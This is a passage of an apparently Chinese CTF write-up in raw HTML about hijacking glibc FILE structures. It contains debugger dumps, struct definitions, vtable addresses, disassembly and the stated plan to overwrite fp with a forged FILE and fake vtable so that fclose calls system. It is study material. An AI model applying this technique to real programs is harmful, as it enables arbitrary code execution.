<span class=\"number\">1033</span>, </span><br><span class=\"line\">  fd = <span class=\"number\">0x74730a32</span>, </span><br><span class=\"line\">  bk = <span class=\"number\">0x7478742e</span>, </span><br><span class=\"line\">  fd_nextsize = <span class=\"number\">0xa</span>, </span><br><span class=\"line\">  bk_nextsize = <span class=\"number\">0x0</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"number\">0x804c408</span> PREV_INUSE &#123;</span><br><span class=\"line\">  prev_size = <span class=\"number\">0</span>, </span><br><span class=\"line\">  size = <span class=\"number\">353</span>, </span><br><span class=\"line\">  fd = <span class=\"number\">0xfbad2498</span>, </span><br><span class=\"line\">  bk = <span class=\"number\">0x804c570</span>, </span><br><span class=\"line\">  fd_nextsize = <span class=\"number\">0x804c570</span>, </span><br><span class=\"line\">  bk_nextsize = <span class=\"number\">0x804c570</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"number\">0x804c568</span> PREV_INUSE &#123;</span><br><span class=\"line\">  prev_size = <span class=\"number\">0</span>, </span><br><span class=\"line\">  size = <span class=\"number\">4105</span>, </span><br><span class=\"line\">  fd = <span class=\"number\">0x61616161</span>, </span><br><span class=\"line\">  bk = <span class=\"number\">0x61616161</span>, </span><br><span class=\"line\">  fd_nextsize = <span class=\"number\">0x61616161</span>, </span><br><span class=\"line\">  bk_nextsize = <span class=\"number\">0xa6161</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><em><strong>Q1:_IO_read_ptr 等几个指针有神吗作用？</strong></em></p>\n<p>分别对应什么函数功能？为什么修改后，fread 不起作用了</p>\n<p><em><strong>Q2:IO_buf_end -_IO_buf_base = 0x1000 为什么偏移量是 0x1000</strong></em>，内容堆块大小为 0x1008</p>\n</li>\n<li>\n<h3 id=\"分析__io_file_plusneide一些内容\"><a class=\"markdownIt-Anchor\" href=\"#分析__io_file_plusneide一些内容\">#</a> 分析 ——__IO_FILE_plusneide 一些内容</h3>\n<p>_flags FILE 结构体的一些状态；_markers 为指向 markers 结构体的指针变量，为一个单向链表结构，存放流的位置；_chain 变量为一个链表的指针，进程中创建的 FILE 结构体会通过这个变量连成一个单向链表；</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*_IO_FILE结构体*/</span></span><br><span class=\"line\"><span class=\"comment\">/* libio/libio.h */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE</span> &#123;</span></span><br><span class=\"line\">  <span class=\"type\">int</span> _flags;       <span class=\"comment\">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _IO_file_flags _flags</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class=\"line\">  <span class=\"comment\">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_read_ptr;   <span class=\"comment\">/* Current read pointer */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_read_end;   <span class=\"comment\">/* End of get area. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_read_base;  <span class=\"comment\">/* Start of putback+get area. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_write_base; <span class=\"comment\">/* Start of put area. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_write_ptr;  <span class=\"comment\">/* Current put pointer. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_write_end;  <span class=\"comment\">/* End of put area. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_buf_base;   <span class=\"comment\">/* Start of reserve area. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_buf_end;    <span class=\"comment\">/* End of reserve area. */</span></span><br><span class=\"line\">  <span class=\"comment\">/* The following fields are used to support backing up and undo. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *_IO_save_base; <span class=\"comment\">/* Pointer to start of non-current get area. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *_IO_backup_base;  <span class=\"comment\">/* Pointer to first valid character of backup area */</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *_IO_save_end; <span class=\"comment\">/* Pointer to end of non-current get area. */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_marker</span> *_<span class=\"title\">markers</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE</span> *_<span class=\"title\">chain</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">int</span> _fileno;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> 0</span></span><br><span class=\"line\">  <span class=\"type\">int</span> _blksize;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\">  <span class=\"type\">int</span> _flags2;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">  _IO_off_t _old_offset; <span class=\"comment\">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> __HAVE_COLUMN <span class=\"comment\">/* temporary */</span></span></span><br><span class=\"line\">  <span class=\"comment\">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">short</span> _cur_column;</span><br><span class=\"line\">  <span class=\"type\">signed</span> <span class=\"type\">char</span> _vtable_offset;</span><br><span class=\"line\">  <span class=\"type\">char</span> _shortbuf[<span class=\"number\">1</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  _IO_lock_t *_lock;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE_complete</span>  //新版本下已经被删除</span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE</span> _<span class=\"title\">file</span>;</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class=\"line\">  _IO_off64_t _offset;</span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class=\"line\">  <span class=\"comment\">/* Wide character stream stuff.  */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_codecvt</span> *_<span class=\"title\">codecvt</span>;</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_wide_data</span> *_<span class=\"title\">wide_data</span>;</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE</span> *_<span class=\"title\">freeres_list</span>;</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *_freeres_buf;</span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">else</span></span></span><br><span class=\"line\">  <span class=\"type\">void</span> *__pad1;</span><br><span class=\"line\">  <span class=\"type\">void</span> *__pad2;</span><br><span class=\"line\">  <span class=\"type\">void</span> *__pad3;</span><br><span class=\"line\">  <span class=\"type\">void</span> *__pad4;</span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">endif</span></span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> __pad5;</span><br><span class=\"line\">  <span class=\"type\">int</span> _mode;</span><br><span class=\"line\">  <span class=\"comment\">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class=\"line\">  <span class=\"type\">char</span> _unused2[<span class=\"number\">15</span> * <span class=\"keyword\">sizeof</span> (<span class=\"type\">int</span>) - <span class=\"number\">4</span> * <span class=\"keyword\">sizeof</span> (<span class=\"type\">void</span> *) - <span class=\"keyword\">sizeof</span> (<span class=\"type\">size_t</span>)];</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class=\"line\"></span><br><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_FILE_plus *)<span class=\"number\">0x804c410</span></span><br><span class=\"line\">$<span class=\"number\">22</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">-72538984</span>, </span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x804d570</span> <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _IO_save_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _markers = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _chain = <span class=\"number\">0xf7fb7cc0</span> &lt;_IO_2_1_stderr_&gt;, </span><br><span class=\"line\">    _fileno = <span class=\"number\">3</span>, </span><br><span class=\"line\">    _flags2 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _old_offset = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _cur_column = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">0</span> <span class=\"string\">&#x27;\\000&#x27;</span>, </span><br><span class=\"line\">    _shortbuf = <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _lock = <span class=\"number\">0x804c4a8</span>, </span><br><span class=\"line\">    _offset = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x804c4b4</span>, </span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    __pad5 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _mode = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _unused2 = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">39</span> times&gt;</span><br><span class=\"line\">  &#125;, </span><br><span class=\"line\">  vtable = <span class=\"number\">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<h3 id=\"回归题目思路明确溢出修改fd的plus调用close时调用system\"><a class=\"markdownIt-Anchor\" href=\"#回归题目思路明确溢出修改fd的plus调用close时调用system\">#</a> 回归题目，思路明确，溢出修改 fd 的 plus，调用 close 时调用 system，</h3>\n<p>下面时 vtable 的一些内容</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_jump_t</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    JUMP_FIELD(<span class=\"type\">size_t</span>, __dummy);</span><br><span class=\"line\">    JUMP_FIELD(<span class=\"type\">size_t</span>, __dummy2);</span><br><span class=\"line\">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class=\"line\">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class=\"line\">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class=\"line\">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class=\"line\">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class=\"line\">    <span class=\"comment\">/* showmany */</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class=\"line\">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class=\"line\">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class=\"line\">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class=\"line\">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class=\"line\">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class=\"line\">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class=\"line\">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class=\"line\">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class=\"line\">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class=\"line\">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class=\"line\">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class=\"line\">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class=\"line\">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> 0</span></span><br><span class=\"line\">    get_column;</span><br><span class=\"line\">    set_column;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>程序运行时的情况</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p &amp;_IO_file_jumps</span><br><span class=\"line\">$<span class=\"number\">28</span> = (<span class=\"type\">const</span> <span class=\"keyword\">struct</span> _IO_jump_t *) <span class=\"number\">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_jump_t *)<span class=\"number\">0xf7fb6ac0</span></span><br><span class=\"line\">$<span class=\"number\">27</span> = &#123;</span><br><span class=\"line\">  __dummy = <span class=\"number\">0</span>, </span><br><span class=\"line\">  __dummy2 = <span class=\"number\">0</span>, </span><br><span class=\"line\">  __finish = <span class=\"number\">0xf7e6d990</span> &lt;_IO_new_file_finish&gt;, </span><br><span class=\"line\">  __overflow = <span class=\"number\">0xf7e6e3b0</span> &lt;_IO_new_file_overflow&gt;, </span><br><span class=\"line\">  __underflow = <span class=\"number\">0xf7e6e150</span> &lt;_IO_new_file_underflow&gt;, </span><br><span class=\"line\">  __uflow = <span class=\"number\">0xf7e6f230</span> &lt;__GI__IO_default_uflow&gt;, </span><br><span class=\"line\">  __pbackfail = <span class=\"number\">0xf7e700c0</span> &lt;__GI__IO_default_pbackfail&gt;, </span><br><span class=\"line\">  __xsputn = <span class=\"number\">0xf7e6d600</span> &lt;_IO_new_file_xsputn&gt;, </span><br><span class=\"line\">  __xsgetn = <span class=\"number\">0xf7e6d210</span> &lt;__GI__IO_file_xsgetn&gt;, </span><br><span class=\"line\">  __seekoff = <span class=\"number\">0xf7e6c4b0</span> &lt;_IO_new_file_seekoff&gt;, </span><br><span class=\"line\">  __seekpos = <span class=\"number\">0xf7e6f4d0</span> &lt;_IO_default_seekpos&gt;, </span><br><span class=\"line\">  __setbuf = <span class=\"number\">0xf7e6c2f0</span> &lt;_IO_new_file_setbuf&gt;, </span><br><span class=\"line\">  __sync = <span class=\"number\">0xf7e6c1e0</span> &lt;_IO_new_file_sync&gt;, </span><br><span class=\"line\">  __doallocate = <span class=\"number\">0xf7e618d0</span> &lt;__GI__IO_file_doallocate&gt;, </span><br><span class=\"line\">  __read = <span class=\"number\">0xf7e6d5b0</span> &lt;__GI__IO_file_read&gt;, </span><br><span class=\"line\">  __write = <span class=\"number\">0xf7e6d060</span> &lt;_IO_new_file_write&gt;, </span><br><span class=\"line\">  __seek = <span class=\"number\">0xf7e6cda0</span> &lt;__GI__IO_file_seek&gt;, </span><br><span class=\"line\">  __close = <span class=\"number\">0xf7e6c2c0</span> &lt;__GI__IO_file_close&gt;, </span><br><span class=\"line\">  __stat = <span class=\"number\">0xf7e6d040</span> &lt;__GI__IO_file_stat&gt;, </span><br><span class=\"line\">  __showmanyc = <span class=\"number\">0xf7e70250</span> &lt;_IO_default_showmanyc&gt;, </span><br><span class=\"line\">  __imbue = <span class=\"number\">0xf7e70260</span> &lt;_IO_default_imbue&gt;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>因为当前版本还是 2.23，可以直接修改虚表，但是为了方便还是修改修改 fd 里面的指针，指向一个伪造虚表</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bss:<span class=\"number\">0804B</span>260 name            db <span class=\"number\">20</span>h <span class=\"title function_\">dup</span><span class=\"params\">(?)</span>           ; DATA XREF: main+<span class=\"number\">9F</span>↑o</span><br><span class=\"line\">.bss:<span class=\"number\">0804B</span>260                                         ; main+B4↑o</span><br><span class=\"line\">.bss:<span class=\"number\">0804B</span>280                 public fp</span><br><span class=\"line\">.bss:<span class=\"number\">0804B</span>280 ; FILE *fp</span><br><span class=\"line\">.bss:<span class=\"number\">0804B</span>280 fp              dd ?                    ; DATA XREF: openfile+<span class=\"number\">6</span>↑r</span><br><span class=\"line\">.bss:<span class=\"number\">0804B</span>280                                         ; openfile+AD↑w ...</span><br><span class=\"line\">.bss:<span class=\"number\">0804B</span>280 _bss            ends</span><br><span class=\"line\">.bss:<span class=\"number\">0804B</span>280</span><br><span class=\"line\">.prgend:<span class=\"number\">0804B</span>284 ; ===========================================================================</span><br><span class=\"line\">.prgend:<span class=\"number\">0804B</span>284</span><br><span class=\"line\">.prgend:<span class=\"number\">0804B</span>284 ; Segment type: Zero-length</span><br><span class=\"line\">.prgend:<span class=\"number\">0804B</span>284 _prgend         segment byte public <span class=\"string\">&#x27;&#x27; use32</span></span><br><span class=\"line\"><span class=\"string\">.prgend:0804B284 _end            label byte</span></span><br><span class=\"line\"><span class=\"string\">.prgend:0804B284 _prgend         ends</span></span><br><span class=\"line\"><span class=\"string\">.prgend:0804B284</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B288 ; ===========================================================================</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B288</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B288 ; Segment type: Externs</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B288 ; extern</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B288 ; char *strstr(const char *haystack, const char *needle)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B288                 extrn strstr:near       ; CODE XREF: _strstr↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B288                                         ; DATA XREF: .got.plt:off_804B00C↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B28C ; int printf(const char *format, ...)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B28C                 extrn printf:near       ; CODE XREF: _printf↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B28C                                         ; DATA XREF: .got.plt:off_804B010↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B290 ; int fclose(FILE *stream)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B290                 extrn fclose:near       ; CODE XREF: _fclose↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B290                                         ; DATA XREF: .got.plt:off_804B014↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B294 ; __sighandler_t signal(int sig, __sighandler_t handler)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B294                 extrn signal:near       ; CODE XREF: _signal↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B294                                         ; DATA XREF: .got.plt:off_804B018↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B298 ; unsigned int alarm(unsigned int seconds)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B298                 extrn alarm:near        ; CODE XREF: _alarm↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B298                                         ; DATA XREF: .got.plt:off_804B01C↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B29C ; size_t fread(void *ptr, size_t size, size_t n, FILE *stream)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B29C                 extrn fread:near        ; CODE XREF: _fread↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B29C                                         ; DATA XREF: .got.plt:off_804B020↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2A0 ; int puts(const char *s)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2A0                 extrn puts:near         ; CODE XREF: _puts↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2A0                                         ; DATA XREF: .got.plt:off_804B024↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2A4 ; void exit(int status)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2A4                 extrn exit:near         ; CODE XREF: _exit↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2A4                                         ; DATA XREF: 